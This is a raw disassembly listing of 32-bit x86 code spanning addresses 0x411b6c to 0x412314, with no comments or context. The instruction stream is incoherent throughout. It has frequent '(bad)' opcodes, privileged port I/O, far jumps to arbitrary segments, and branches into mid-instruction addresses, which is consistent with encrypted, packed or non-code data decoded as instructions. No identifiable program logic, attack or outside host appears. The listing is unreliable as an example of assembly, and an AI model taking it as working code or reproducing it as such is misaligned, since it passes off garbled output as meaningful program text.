  411b6c:	sbb    BYTE PTR [ebx],dl
  411b6e:	leave  
  411b6f:	ror    BYTE PTR fs:[edx],cl
  411b72:	jmp    0xf5f5:0xf41e3c79
  411b79:	xor    eax,0x8e456f95
  411b7e:	mov    dl,0x67
  411b80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b81:	jnp    0x411bf5
  411b83:	and    ah,al
  411b85:	out    dx,eax
  411b86:	shr    ch,cl
  411b88:	jbe    0x411bad
  411b8a:	sbb    al,0xe
  411b8c:	jecxz  0x411b5a
  411b8e:	cdq    
  411b8f:	xor    edx,DWORD PTR [edi]
  411b91:	push   cs
  411b92:	pop    ds
  411b93:	ds jl  0x411ba6
  411b96:	lea    edi,[esi]
  411b98:	add    al,al
  411b9a:	push   edx
  411b9b:	int    0xbc
  411b9d:	push   edx
  411b9e:	or     eax,0x4a3d1b2f
  411ba3:	adc    al,0x72
  411ba5:	cs aam 0x3c
  411ba8:	iret   
  411ba9:	test   esi,ecx
  411bab:	xchg   edi,eax
  411bac:	jne    0x411c0e
  411bae:	mov    bl,0xfd
  411bb0:	and    edi,DWORD PTR [edi]
  411bb2:	or     eax,0x6d07002
  411bb7:	(bad)  
  411bb8:	cmp    eax,0x9f2258f6
  411bbd:	iret   
  411bbe:	push   ebx
  411bc0:	rcl    al,1
  411bc2:	adc    BYTE PTR [eax-0x4e],ch
  411bc5:	shl    ebp,1
  411bc7:	push   0x3b31d931
  411bcc:	retf   
  411bcd:	inc    eax
  411bce:	pop    esp
  411bcf:	xchg   edi,eax
  411bd0:	or     DWORD PTR [ecx-0x45],ebp
  411bd3:	jmp    0x411bc8
  411bd5:	div    BYTE PTR [ecx+0x31]
  411bd8:	push   ecx
  411bd9:	xchg   al,dl
  411bdb:	sub    al,BYTE PTR [esi+0x60]
  411bde:	mov    bh,0x2d
  411be0:	cli    
  411be1:	in     eax,0xa2
  411be3:	aad    0x42
  411be5:	jae    0x411bf7
  411be7:	repnz imul edx,DWORD PTR [ebx-0x67],0xfffffffa
  411bec:	test   BYTE PTR [edi],ch
  411bee:	xchg   esi,eax
  411bef:	adc    eax,0x84941341
  411bf4:	ret    
  411bf5:	loope  0x411bad
  411bf7:	out    dx,eax
  411bf8:	mov    al,0x95
  411bfa:	mov    eax,esp
  411bfc:	mov    DWORD PTR [eax-0x69e5fea4],eax
  411c02:	dec    esp
  411c03:	xlat   BYTE PTR ds:[ebx]
  411c04:	jne    0x411c22
  411c06:	cmp    al,0x78
  411c08:	lock mov al,0xa6
  411c0b:	imul   ecx,ecx,0xc8e229fa
  411c11:	dec    edi
  411c12:	retf   
  411c13:	rcr    eax,1
  411c15:	mov    dl,0x63
  411c17:	xor    ch,ch
  411c19:	sub    eax,0xb71542f6
  411c1e:	(bad)  
  411c21:	jmp    0x411c9d
  411c23:	pop    ebx
  411c24:	mov    edx,edi
  411c26:	and    DWORD PTR [eax+0x2e5c08cf],eax
  411c2c:	xlat   BYTE PTR ds:[ebx]
  411c2d:	das    
  411c2e:	xchg   edx,eax
  411c2f:	leave  
  411c30:	in     al,0x7b
  411c32:	addr16 iret 
  411c34:	sahf   
  411c35:	inc    ebp
  411c36:	pop    edi
  411c37:	pop    edi
  411c38:	lahf   
  411c39:	data16 fidivr DWORD PTR gs:[ebp-0x4c]
  411c3e:	jbe    0x411c26
  411c40:	mov    bh,0xac
  411c42:	pushf  
  411c43:	or     al,0xed
  411c45:	mov    ?,ebx
  411c47:	arpl   WORD PTR [ebx],bp
  411c49:	cmc    
  411c4a:	stos   DWORD PTR es:[edi],eax
  411c4b:	xchg   edi,eax
  411c4c:	jnp    0x411caa
  411c4e:	je     0x411c87
  411c50:	add    BYTE PTR [ecx+0x57],bh
  411c53:	fs push ebp
  411c55:	push   ebp
  411c56:	lods   eax,DWORD PTR ds:[esi]
  411c57:	icebp  
  411c58:	inc    ch
  411c5a:	mov    edx,0x4a8aaaab
  411c5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c60:	or     bl,0x97
  411c63:	das    
  411c64:	aaa    
  411c65:	popf   
  411c66:	xlat   BYTE PTR ds:[ebx]
  411c67:	fcmovnu st,st(3)
  411c69:	imul   ecx,ebp,0x54
  411c6c:	aam    0xee
  411c6e:	fld    st(4)
  411c70:	ja     0x411c33
  411c72:	sub    eax,0x543a6a12
  411c77:	push   ebp
  411c78:	aad    0x22
  411c7a:	xchg   ebp,eax
  411c7b:	test   eax,0x85e2a9a9
  411c80:	or     edx,DWORD PTR [edi]
  411c82:	ds inc edx
  411c84:	sub    eax,0x36b5ce88
  411c89:	pop    edi
  411c8a:	xchg   edi,eax
  411c8b:	or     DWORD PTR [esi+0x576eff9d],edi
  411c91:	(bad)  
  411c92:	adc    dh,dl
  411c94:	mov    ecx,0x498e2f6f
  411c99:	popa   
  411c9a:	pusha  
  411c9b:	test   eax,0xf2d6d105
  411ca0:	jne    0x411caa
  411ca2:	loopne 0x411cd7
  411ca4:	add    bh,0x1e
  411ca7:	jnp    0x411c55
  411ca9:	in     al,0x72
  411cab:	mov    ecx,0x7c7c7efe
  411cb0:	cld    
  411cb1:	jl     0x411cd5
  411cb3:	xchg   ecx,eax
  411cb4:	sar    dl,0xf5
  411cb7:	jmp    0x411c50
  411cb9:	clc    
  411cba:	mov    bl,0x32
  411cbc:	mov    eax,ds:0xfe89f715
  411cc1:	push   0xffffffbb
  411cc3:	repz scas al,BYTE PTR es:[edi]
  411cc5:	push   es
  411cc6:	pop    edx
  411cc7:	mov    ecx,0x16761c00
  411ccc:	mov    DWORD PTR [eax],edi
  411cce:	add    BYTE PTR [edi-0x39df31d4],ah
  411cd4:	add    al,ah
  411cd6:	addr16 mov eax,ds:0x9ed1
  411cda:	push   0x5aad5abb
  411cdf:	xor    edi,edi
  411ce1:	mov    BYTE PTR [esi-0x7a],ch
  411ce4:	pop    ebp
  411ce5:	popf   
  411ce6:	xlat   BYTE PTR fs:[ebx]
  411ce8:	push   es
  411ce9:	add    BYTE PTR [edi+0x387083c7],cl
  411cef:	or     al,0xc3
  411cf1:	xor    BYTE PTR [eax],dl
  411cf3:	mov    eax,ebp
  411cf5:	or     bh,bl
  411cf7:	imul   edi
  411cf9:	(bad)  
  411cfa:	fcomip st,st(5)
  411cfc:	mov    eax,ds:0x13d681e7
  411d01:	mov    esi,0x6ad94288
  411d06:	fisttp QWORD PTR [esi-0x5d]
  411d09:	mov    edi,DWORD PTR [ebp+0x3131f953]
  411d0f:	aad    0x5d
  411d11:	ss push esi
  411d13:	inc    ebp
  411d14:	dec    ebx
  411d15:	mov    eax,0xf07015da
  411d1a:	jmp    0x8402fe00
  411d1f:	mov    DWORD PTR [edi],eax
  411d21:	push   ds
  411d22:	js     0x411d04
  411d24:	mov    bh,0xf1
  411d26:	js     0x411d24
  411d28:	aas    
  411d29:	sti    
  411d2a:	jl     0x411cea
  411d2c:	rcl    BYTE PTR [esi+0x19ac5b2d],1
  411d32:	outs   dx,DWORD PTR ds:[esi]
  411d33:	in     al,dx
  411d34:	xor    al,0x23
  411d36:	sar    al,1
  411d38:	pusha  
  411d39:	jns    0x411d96
  411d3b:	mov    edx,0xaf80fc5d
  411d40:	mov    edi,DWORD PTR [esi-0x20e71348]
  411d46:	addr16 ficom WORD PTR [bp+di]
  411d4a:	les    ecx,FWORD PTR [esi]
  411d4c:	inc    ecx
  411d4d:	in     eax,dx
  411d4e:	(bad)  
  411d4f:	jmp    0x6dabf2ee
  411d54:	out    0x5c,al
  411d56:	xor    DWORD PTR ds:0x9a367c58,esp
  411d5c:	(bad)  
  411d5d:	pop    esp
  411d5e:	aam    0xde
  411d60:	je     0x411cff
  411d62:	inc    edx
  411d63:	mov    eax,ds:0x6cb97280
  411d68:	dec    ebp
  411d69:	sub    eax,0x35a69a67
  411d6e:	sub    dl,BYTE PTR [eax-0x4f]
  411d71:	pop    eax
  411d72:	ins    BYTE PTR es:[edi],dx
  411d73:	sbb    cl,BYTE PTR [ebx-0x5120a080]
  411d79:	leave  
  411d7a:	mov    dl,0xde
  411d7c:	in     eax,0x17
  411d7e:	popf   
  411d7f:	popf   
  411d80:	popf   
  411d81:	xor    al,0xf3
  411d83:	push   esp
  411d84:	stc    
  411d85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d86:	xchg   edi,eax
  411d87:	pop    esi
  411d88:	jp     0x411d70
  411d8a:	fnsave [edi-0x21]
  411d8d:	jge    0x411d92
  411d8f:	xor    eax,0xe8265fdf
  411d94:	pop    esp
  411d95:	dec    eax
  411d96:	inc    ebp
  411d97:	mov    eax,ds:0x997c13b4
  411d9c:	fild   QWORD PTR [esi]
  411d9e:	adc    esi,edx
  411da0:	push   esi
  411da1:	in     al,0xc2
  411da3:	add    eax,DWORD PTR [ecx+0x1898b3ad]
  411da9:	sbb    al,0x2
  411dab:	clc    
  411dac:	mov    ecx,fs
  411dae:	loopne 0x411d71
  411db0:	or     DWORD PTR [ebx+0x56ef77bb],0x66
  411db7:	data16 data16 imul BYTE PTR [eax]
  411dbb:	mov    al,BYTE PTR [edx+0x5a371b8d]
  411dc1:	xor    ecx,esi
  411dc3:	mov    BYTE PTR [edx-0x10304bf6],al
  411dc9:	pop    ss
  411dca:	test   DWORD PTR [ecx-0x42f66e32],ebx
  411dd0:	in     al,dx
  411dd1:	cmp    bh,ah
  411dd3:	pop    esi
  411dd4:	lods   eax,DWORD PTR ds:[esi]
  411dd5:	and    BYTE PTR [ebx],dl
  411dd7:	and    bh,BYTE PTR [ebx-0x4d9d8b22]
  411ddd:	push   cs
  411dde:	push   eax
  411ddf:	dec    ebx
  411de0:	in     al,dx
  411de1:	xchg   ecx,eax
  411de2:	adc    DWORD PTR [eax],eax
  411de4:	inc    ecx
  411de5:	push   ecx
  411de6:	sbb    dl,BYTE PTR [ebx+0x73]
  411de9:	leave  
  411dea:	jmp    0x29a3:0x91a1d743
  411df1:	push   ebx
  411df2:	mov    al,0x5a
  411df4:	lods   eax,DWORD PTR ds:[esi]
  411df5:	lea    ecx,ss:[ebx]
  411df8:	leave  
  411df9:	push   ebx
  411dfa:	scas   al,BYTE PTR es:[edi]
  411dfb:	pop    ebx
  411dfc:	mov    ecx,0xc269a638
  411e01:	out    dx,eax
  411e02:	mul    DWORD PTR [ebx-0x65ec4c4d]
  411e08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e09:	popa   
  411e0a:	jp     0x411e86
  411e0c:	fidivr DWORD PTR [ebp+ebp*8-0x4b]
  411e10:	xlat   BYTE PTR ds:[ebx]
  411e11:	sahf   
  411e12:	jge    0x411dfb
  411e14:	popf   
  411e15:	ja     0x411e75
  411e17:	inc    edi
  411e18:	lods   eax,DWORD PTR ds:[esi]
  411e19:	fstp   QWORD PTR [edi+0xd327082]
  411e1f:	into   
  411e20:	int    0x77
  411e22:	xchg   ecx,eax
  411e23:	sbb    al,0xec
  411e25:	add    bh,BYTE PTR [edx+0x32]
  411e28:	push   ebx
  411e29:	fmulp  st(6),st
  411e2b:	mov    esp,0x2a87dd17
  411e30:	mov    ebx,0xdd828aef
  411e35:	push   cs
  411e36:	add    DWORD PTR [esi+eax*1+0x71],edi
  411e3a:	call   0xf738c00f
  411e3f:	in     al,dx
  411e40:	fst    DWORD PTR [ebx]
  411e42:	mov    al,bh
  411e44:	jecxz  0x411ebd
  411e46:	add    eax,eax
  411e48:	mov    dh,0x6d
  411e4a:	fneni(8087 only) 
  411e4c:	jbe    0x411e09
  411e4e:	shl    edi,0xa
  411e51:	push   0xcaeda9a5
  411e56:	mov    ah,0x23
  411e58:	push   es
  411e59:	sbb    ecx,eax
  411e5b:	enter  0xd62,0xad
  411e5f:	and    BYTE PTR [esi],ah
  411e61:	repz mov ah,0x5a
  411e64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e65:	jmp    0x411df9
  411e67:	mov    al,0xd9
  411e69:	mov    ch,0xe3
  411e6b:	repz push esi
  411e6d:	adc    DWORD PTR [edx-0x3],ecx
  411e70:	in     eax,0xd7
  411e72:	adc    bh,cl
  411e74:	sub    DWORD PTR [edi+0x5c94d6cb],edx
  411e7a:	aad    0x6a
  411e7c:	mov    ds:0x4def3f1f,eax
  411e81:	sub    BYTE PTR [ebx-0x2e5920f1],ch
  411e87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e88:	shr    ecx,cl
  411e8a:	xor    al,0x12
  411e8c:	mov    DWORD PTR [esi+ecx*2],eax
  411e8f:	lahf   
  411e90:	ds std 
  411e92:	jmp    0x1a22:0xf2bcaf2b
  411e99:	jae    0x411e95
  411e9b:	mov    ch,0x12
  411e9d:	pop    eax
  411e9e:	cmp    esi,DWORD PTR [ebx+0x7f]
  411ea1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ea2:	cmp    DWORD PTR ds:0x1271ebbb,0xc0899a00
  411eac:	and    DWORD PTR [eax+0x1d0e03cf],eax
  411eb2:	cmp    dh,BYTE PTR [eax+esi*8-0x7f]
  411eb6:	pop    es
  411eb7:	push   ds
  411eb8:	cmp    BYTE PTR [esi],dh
  411eba:	aas    
  411ebb:	aas    
  411ebc:	mov    edi,0x5c489135
  411ec1:	xlat   BYTE PTR ds:[ebx]
  411ec2:	rcl    ebx,cl
  411ec4:	add    ecx,0xffffffc1
  411ec7:	inc    ecx
  411ec8:	retf   
  411ec9:	aam    0x5
  411ecb:	xchg   esi,eax
  411ecc:	mov    edx,0xdbc27600
  411ed1:	mov    ?,WORD PTR [eax]
  411ed3:	fs inc esp
  411ed5:	and    bl,bl
  411ed7:	xlat   BYTE PTR ds:[ebx]
  411ed8:	push   cs
  411ed9:	xor    ah,BYTE PTR [ecx-0x4e]
  411edc:	xor    edi,ebp
  411ede:	lds    esi,FWORD PTR [edx]
  411ee0:	xor    al,0x10
  411ee2:	push   0x50278ab
  411ee7:	inc    esi
  411ee8:	sub    DWORD PTR [ebx],esi
  411eea:	push   eax
  411eeb:	jbe    0x411f6c
  411eed:	xor    bl,ch
  411eef:	leave  
  411ef0:	ins    DWORD PTR es:[edi],dx
  411ef1:	mov    ds:0x349e5fb4,al
  411ef6:	inc    esp
  411ef7:	popf   
  411ef8:	cmp    BYTE PTR [eax-0x60fa3ca5],0x9a
  411eff:	adc    DWORD PTR [ebx-0x4f],esp
  411f02:	sbb    dl,ah
  411f04:	icebp  
  411f05:	clc    
  411f06:	in     al,dx
  411f07:	mov    eax,ds:0x7e9e8743
  411f0c:	jecxz  0x411e9b
  411f0e:	aaa    
  411f0f:	inc    BYTE PTR [ebp-0x29]
  411f12:	jne    0x411f85
  411f14:	sub    al,0x9
  411f16:	fldcw  WORD PTR [edi-0x55]
  411f19:	inc    ebp
  411f1a:	xor    al,0xf7
  411f1c:	lds    ebp,FWORD PTR [eax+0x4e52597d]
  411f22:	sub    ax,0x2488
  411f26:	jo     0x411eed
  411f28:	int    0xdc
  411f2a:	push   cs
  411f2b:	add    DWORD PTR [esi+eax*4-0xf],edi
  411f2f:	(bad)  
  411f30:	pop    ebx
  411f31:	outs   dx,DWORD PTR ds:[esi]
  411f32:	(bad)  
  411f33:	out    dx,eax
  411f34:	fidivr WORD PTR [ebp-0x6ad5af05]
  411f3a:	cli    
  411f3b:	(bad)  
  411f3c:	jecxz  0x411f21
  411f3e:	jecxz  0x411f7d
  411f40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f41:	imul   esp,DWORD PTR [edx-0x15],0x8708add6
  411f48:	ret    
  411f49:	(bad)  
  411f4a:	dec    esp
  411f4b:	cmp    ah,bl
  411f4d:	pushf  
  411f4e:	mov    bh,0x13
  411f50:	outs   dx,BYTE PTR ds:[esi]
  411f51:	fidiv  DWORD PTR [esi-0x1dba06cd]
  411f57:	adc    bl,cl
  411f59:	mov    bh,al
  411f5b:	or     BYTE PTR [edx],dh
  411f5d:	ins    DWORD PTR es:[edi],dx
  411f5e:	das    
  411f5f:	or     dh,BYTE PTR [edi+0x475e2eb8]
  411f65:	xor    al,0xd3
  411f67:	gs xbegin 0x80978523
  411f6e:	in     al,dx
  411f6f:	jle    0x411fb5
  411f71:	add    dl,BYTE PTR [esp+ebx*8-0x6e00843d]
  411f78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f79:	shl    DWORD PTR [edi-0x9],0x75
  411f7d:	mov    ecx,0x2244885c
  411f82:	or     BYTE PTR [ebp+0x52a54842],al
  411f88:	cwde   
  411f89:	pushf  
  411f8a:	pushf  
  411f8b:	inc    esp
  411f8c:	and    dl,BYTE PTR [ecx-0x40a80708]
  411f92:	cli    
  411f93:	aad    0x7f
  411f95:	cli    
  411f96:	loopne 0x411f1b
  411f98:	divps  xmm5,XMMWORD PTR [ebx-0x37f074f1]
  411f9f:	add    eax,0x8713ef99
  411fa4:	xchg   ebp,eax
  411fa5:	mov    bl,0x2b
  411fa7:	outs   dx,DWORD PTR ds:[esi]
  411fa8:	aaa    
  411fa9:	loopne 0x411f57
  411fab:	sub    al,0xb0
  411fad:	(bad)  
  411fae:	jg     0x41200b
  411fb0:	or     ebp,edi
  411fb2:	mov    cl,BYTE PTR [ecx-0x40]
  411fb5:	and    DWORD PTR [eax+0x7ade38cf],eax
  411fbb:	jmp    0x411f6a
  411fbd:	int3   
  411fbe:	add    ecx,DWORD PTR [edi]
  411fc0:	cmp    al,0xb0
  411fc2:	mov    edi,0xc60ead5a
  411fc7:	bound  esi,QWORD PTR [ecx+0x2cd9b29b]
  411fcd:	push   es
  411fce:	pop    es
  411fcf:	pop    es
  411fd0:	mov    cl,0x6e
  411fd2:	fnstsw WORD PTR [edx]
  411fd4:	stos   DWORD PTR es:[edi],eax
  411fd5:	and    ecx,DWORD PTR [edi+ebx*4]
  411fd8:	and    BYTE PTR [ebp-0x47],0xd6
  411fdc:	add    BYTE PTR [edi+0x3b],al
  411fdf:	mov    bh,0x80
  411fe1:	dec    DWORD PTR [edx+0x64c789e7]
  411fe7:	stc    
  411fe8:	add    DWORD PTR [edx-0x1c12ce0],esp
  411fee:	retf   
  411fef:	out    0x16,eax
  411ff1:	adc    al,0xef
  411ff3:	ror    ebx,0x52
  411ff6:	mov    bl,0x1f
  411ff8:	in     eax,0xfd
  411ffa:	repz xor dh,BYTE PTR [edx]
  411ffd:	push   edx
  411ffe:	sub    BYTE PTR [ebp+0x33c4d64a],dl
  412004:	in     al,0xe
  412006:	sar    BYTE PTR ds:0x2861a7a8,1
  41200c:	adc    al,0xb2
  41200e:	data16 adc BYTE PTR [edx+0x4d22f178],bh
  412015:	inc    edi
  412016:	jg     0x412016
  412018:	xchg   edi,eax
  412019:	mov    edi,0x2fb7e5fc
  41201e:	pop    esi
  41201f:	mov    esp,0x708011f8
  412024:	std    
  412025:	jb     0x412059
  412027:	xor    edi,DWORD PTR [edi+0x39]
  41202a:	es mov edi,0xa76f4f9d
  412030:	jmp    0xf8479322
  412035:	add    edx,DWORD PTR [esi-0x7b]
  412038:	fild   QWORD PTR [ebx]
  41203a:	ret    0x6bd5
  41203d:	or     esi,DWORD PTR [edx+0x70]
  412040:	int    0xf1
  412042:	in     al,dx
  412043:	mov    bl,0xcf
  412045:	(bad)  
  412046:	lods   eax,DWORD PTR ds:[esi]
  412047:	scas   al,BYTE PTR es:[edi]
  412048:	jmp    0x412049
  41204a:	xor    eax,0xbcef0e1c
  41204f:	jmp    0x79f1bbfa
  412054:	repz data16 je 0x4120cd
  412058:	jne    0x41207b
  41205a:	fwait
  41205b:	int    0x5a
  41205d:	xchg   ebx,eax
  41205e:	fwait
  41205f:	repnz mov ah,0x5a
  412062:	push   ecx
  412063:	clc    
  412064:	in     eax,dx
  412065:	push   es
  412066:	stc    
  412067:	loopne 0x412044
  412069:	mov    ds:0x65684125,al
  41206e:	add    eax,edx
  412070:	mov    edx,0x3e4e406c
  412075:	aam    0x16
  412077:	out    dx,eax
  412078:	add    BYTE PTR [esi+ecx*1],ah
  41207b:	fldln2 
  41207d:	cmc    
  41207e:	jp     0x412091
  412080:	mov    DWORD PTR [esp+ebp*2-0x23],eax
  412084:	push   es
  412085:	mov    esi,0x212a54af
  41208a:	cdq    
  41208b:	dec    esp
  41208c:	ss sbb eax,0xafc3ef13
  412092:	dec    ebp
  412093:	fld    QWORD PTR [edi-0x1bbc1307]
  412099:	jbe    0x41209f
  41209b:	add    al,BYTE PTR [ecx]
  41209d:	call   0x3ab5af5c
  4120a2:	(bad)  
  4120a3:	stc    
  4120a4:	stc    
  4120a5:	jns    0x4120f3
  4120a7:	dec    edi
  4120a8:	dec    edi
  4120a9:	jge    0xc03faf3d
  4120af:	jecxz  0x412078
  4120b1:	(bad)  
  4120b2:	dec    ebx
  4120b4:	clc    
  4120b5:	clc    
  4120b6:	clc    
  4120b7:	sub    al,0x1a
  4120b9:	mov    bl,0x4b
  4120bb:	sub    ebp,DWORD PTR [eax+0x4c]
  4120be:	mov    eax,0xabb9a0a1
  4120c3:	mov    ebx,0x6df3f6ca
  4120c8:	mov    al,ds:0x3cc4c659
  4120cd:	add    BYTE PTR [ecx+0x14],bl
  4120d0:	pop    edi
  4120d1:	xchg   esi,eax
  4120d2:	das    
  4120d3:	and    bl,dh
  4120d5:	out    dx,eax
  4120d6:	in     eax,dx
  4120d7:	add    al,0x7f
  4120d9:	inc    ebp
  4120da:	test   al,ah
  4120dc:	adc    al,al
  4120de:	lahf   
  4120df:	sbb    esi,esi
  4120e1:	in     eax,dx
  4120e2:	fist   DWORD PTR [edi]
  4120e4:	xor    al,0xc
  4120e6:	jecxz  0x4120d7
  4120e8:	sub    edx,DWORD PTR [ebp-0x60c19c36]
  4120ee:	outs   dx,DWORD PTR ds:[esi]
  4120ef:	fst    st(6)
  4120f1:	lods   eax,DWORD PTR ds:[esi]
  4120f2:	pop    ebx
  4120f3:	jno    0x4120d0
  4120f5:	ins    DWORD PTR es:[edi],dx
  4120f6:	mov    bh,0x61
  4120f8:	int    0x9a
  4120fa:	xor    eax,0x988b1628
  4120ff:	lahf   
  412100:	lahf   
  412101:	xchg   DWORD PTR [esi+0x2bcf9669],esp
  412107:	imul   esp,DWORD PTR ds:0xe6fca710,0x63
  41210e:	or     eax,0x65e0b270
  412113:	adc    BYTE PTR fs:0x3e481455,al
  41211a:	(bad)  
  41211c:	aas    
  41211d:	mov    BYTE PTR [edi-0x23],0x1
  412121:	rcl    ah,1
  412123:	fsub   QWORD PTR [esi]
  412125:	and    eax,DWORD PTR [eax]
  412127:	jle    0x412157
  412129:	lods   eax,DWORD PTR ds:[esi]
  41212a:	das    
  41212b:	cs cs inc edx
  41212e:	shl    DWORD PTR [ecx+ebp*1],cl
  412131:	fnop   
  412133:	xor    eax,0xbf685d79
  412138:	xlat   BYTE PTR ds:[ebx]
  412139:	jmp    0x4120f0
  41213b:	es lahf 
  41213d:	aad    0x34
  41213f:	or     eax,0x98a3a3a3
  412144:	fwait
  412145:	fwait
  412146:	or     edi,0xffffffe7
  412149:	sub    ecx,DWORD PTR [edi-0xf437374]
  41214f:	repnz retf 
  412151:	das    
  412152:	aas    
  412153:	xchg   ebx,eax
  412154:	retf   
  412155:	in     eax,0x8a
  412157:	cmc    
  412158:	fist   DWORD PTR [ebx-0x1e]
  41215b:	adc    edx,0x119166
  412161:	aas    
  412162:	iret   
  412163:	jp     0x412181
  412165:	sub    al,0x15
  412167:	outs   dx,BYTE PTR ds:[esi]
  412168:	mov    ebx,0xc72f3ea8
  41216d:	iret   
  41216e:	xchg   edi,eax
  41216f:	(bad)  
  412170:	adc    eax,0xc2dbfb36
  412175:	and    DWORD PTR [eax-0x703acc1],eax
  41217b:	(bad)  
  41217c:	aas    
  41217d:	mov    esi,0xa7cd34ce
  412182:	jne    0x4121e1
  412184:	(bad)  
  412185:	cmp    ebx,DWORD PTR [edi-0x64b27831]
  41218b:	ss loope 0x41212c
  41218e:	jnp    0x41217e
  412190:	rcr    edx,0xb5
  412193:	imul   ebp,DWORD PTR [ebp-0x162c6b27],0xffffffb4
  41219a:	in     eax,0xe7
  41219c:	repnz sub eax,ebx
  41219f:	les    esi,FWORD PTR [ecx]
  4121a1:	add    al,ch
  4121a3:	xor    DWORD PTR [ebx],eax
  4121a5:	fs dec ebp
  4121a7:	sub    BYTE PTR [ebp-0x31418234],0x97
  4121ae:	jbe    0x4121b4
  4121b0:	and    BYTE PTR [esi],bl
  4121b2:	jmp    0x41219e
  4121b4:	jmp    0xddc1:0xeec9f6b2
  4121bb:	add    DWORD PTR [edx-0x5f],0x60
  4121bf:	jne    0x4121c7
  4121c1:	mov    ds:0x27a13272,al
  4121c6:	jb     0x4121b9
  4121c8:	sti    
  4121c9:	std    
  4121ca:	xor    al,0x93
  4121cc:	xor    al,0x32
  4121ce:	cdq    
  4121cf:	or     al,0xa2
  4121d1:	shr    DWORD PTR [eax],1
  4121d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121d6:	sub    DWORD PTR [edi],edi
  4121d8:	loopne 0x412211
  4121da:	out    dx,eax
  4121db:	mov    esp,0x7cffcef3
  4121e0:	jmp    0x41218f
  4121e2:	mov    bh,0xde
  4121e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121e5:	push   edi
  4121e6:	and    BYTE PTR [ebp-0x753463e6],0xa8
  4121ed:	loope  0x412254
  4121ef:	pop    edx
  4121f0:	pop    edi
  4121f1:	jbe    0x412191
  4121f3:	push   ebp
  4121f4:	pop    ebp
  4121f5:	fsubr  DWORD PTR [ebx+0x7a]
  4121f8:	xchg   ebx,eax
  4121f9:	xchg   ebp,eax
  4121fa:	imul   esp,DWORD PTR [edi-0x1a],0xdff3227f
  412201:	scas   al,BYTE PTR es:[edi]
  412202:	jb     0x412212
  412204:	dec    BYTE PTR [eax+esi*8+0x3ccf33cc]
  41220b:	bound  ebx,QWORD PTR [edx-0x1a34081a]
  412211:	repnz in eax,dx
  412213:	shl    DWORD PTR [eax-0x30],0xb7
  412217:	gs retf 
  412219:	push   ss
  41221a:	fdivr  QWORD PTR [edx-0x15]
  41221d:	lods   eax,DWORD PTR ds:[esi]
  41221e:	pop    eax
  41221f:	mov    edi,0xb5543d7e
  412224:	lea    edx,ss:[ebp+0x3a]
  412228:	popf   
  412229:	inc    esi
  41222a:	ss fwait
  41222c:	ins    DWORD PTR es:[edi],dx
  41222d:	jmp    0x3c80:0xae294edf
  412234:	pusha  
  412235:	enter  0xc57f,0x75
  412239:	sbb    BYTE PTR [eax],0x74
  41223c:	xchg   ebx,eax
  41223d:	or     DWORD PTR [ebx-0x78983248],ebp
  412243:	mov    ds:0xba8654e3,al
  412248:	inc    esp
  412249:	retf   
  41224a:	enter  0x3441,0xed
  41224e:	retf   
  41224f:	in     eax,0x32
  412251:	xor    bl,BYTE PTR [ecx-0xf26ecb4]
  412257:	fnstcw WORD PTR [ecx+eax*4+0x5a]
  41225b:	push   es
  41225c:	pop    edi
  41225d:	sub    BYTE PTR [edx+esi*4],dl
  412260:	cli    
  412261:	push   esi
  412262:	push   0x8989869a
  412267:	or     DWORD PTR [esp+ecx*2+0x4c],ecx
  41226b:	inc    eax
  41226c:	xlat   BYTE PTR ds:[ebx]
  41226d:	jne    0x4122b2
  41226f:	push   ebp
  412270:	aad    0x8b
  412272:	pop    esi
  412273:	scas   eax,DWORD PTR es:[edi]
  412274:	test   DWORD PTR [edi],0xfe1fc3f
  41227a:	cmpxchg bh,al
  41227d:	mov    dl,0x93
  41227f:	or     DWORD PTR [ecx-0x65],edx
  412282:	mov    eax,edx
  412284:	or     bh,BYTE PTR cs:[ebp+0x3b]
  412288:	add    dl,BYTE PTR [eax-0x65d90967]
  41228e:	test   esi,edi
  412290:	call   0xcf80:0x21c13e09
  412297:	add    DWORD PTR [esi-0x4a960582],ebx
  41229d:	pop    edx
  41229e:	lods   eax,DWORD PTR ds:[esi]
  41229f:	ficom  WORD PTR [ecx+ebp*4+0x54]
  4122a3:	out    dx,al
  4122a4:	push   edi
  4122a5:	push   ebp
  4122a6:	cmc    
  4122a7:	fstp   TBYTE PTR [edx-0x505e8052]
  4122ad:	scas   eax,DWORD PTR es:[edi]
  4122ae:	dec    edi
  4122af:	sbb    eax,0x7541c1c
  4122b4:	push   es
  4122b5:	push   es
  4122b6:	xchg   esp,eax
  4122b7:	int    0x9b
  4122b9:	aaa    
  4122ba:	mov    ds:0x1acfafaf,eax
  4122bf:	push   ecx
  4122c0:	xchg   DWORD PTR [esi-0x3cfd192f],esp
  4122c6:	int    0x7e
  4122c8:	mov    ebx,0x1e406254
  4122cd:	fst    DWORD PTR [edi]
  4122cf:	test   ebx,edx
  4122d1:	outs   dx,BYTE PTR ds:[esi]
  4122d2:	fwait
  4122d3:	mov    ebx,0xe8023205
  4122d8:	call   0xfadbd3c5
  4122dd:	inc    esp
  4122de:	ja     0x412322
  4122e0:	mov    esp,0x581861a7
  4122e5:	pop    esp
  4122e6:	pop    esp
  4122e7:	mov    ah,0x82
  4122e9:	xor    DWORD PTR [ecx+eiz*8],0x4c1e8d2c
  4122f0:	in     al,0x37
  4122f2:	aaa    
  4122f3:	aaa    
  4122f4:	xchg   DWORD PTR [ecx+0x65cb1999],ebx
  4122fa:	shl    BYTE PTR [ebp-0x3],1
  4122fd:	arpl   WORD PTR [edi+0x5573f5cb],dx
  412303:	push   ebp
  412304:	dec    edi
  412305:	add    ebx,DWORD PTR [eax]
  412307:	cli    
  412308:	ror    DWORD PTR [edi-0x436c6b82],1
  41230e:	push   edx
  41230f:	add    eax,0x6513210d
  412314:	test   BYTE PTR [esi+0x155d6c29],cl
